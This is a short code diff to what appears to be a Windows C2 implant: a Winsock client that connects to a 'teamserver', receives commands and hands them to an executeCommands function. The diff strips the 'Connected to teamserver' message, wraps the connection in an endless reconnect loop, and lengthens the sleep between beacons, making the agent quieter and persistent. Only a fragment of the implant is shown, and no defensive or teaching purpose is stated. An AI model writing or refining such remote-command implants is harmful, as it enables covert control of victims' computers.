@@ -41,7 +41,6 @@ int receiveCommands(int s)
             printf("[-] Server disconnected\n");
             return 0;
         }
-
         command[recv_commands] = '\0';
         executeCommands(command,s);
 }
@@ -53,7 +52,7 @@ int main()
     WSADATA wsa;
     SOCKET s;
     struct sockaddr_in server;
-    
+    while(1){
     if(WSAStartup(MAKEWORD(2,2), &wsa) != 0)
     {
         printf("[-] Failed Error code: %d", WSAGetLastError());
@@ -77,11 +76,10 @@ int main()
         return 1;
     }
 
-    printf("Connected to teamserver");
-
     receiveCommands(s);
-    Sleep(2000);
+    Sleep(10000);
     closesocket(s);
     WSACleanup();
+    }
     return 0;
 }
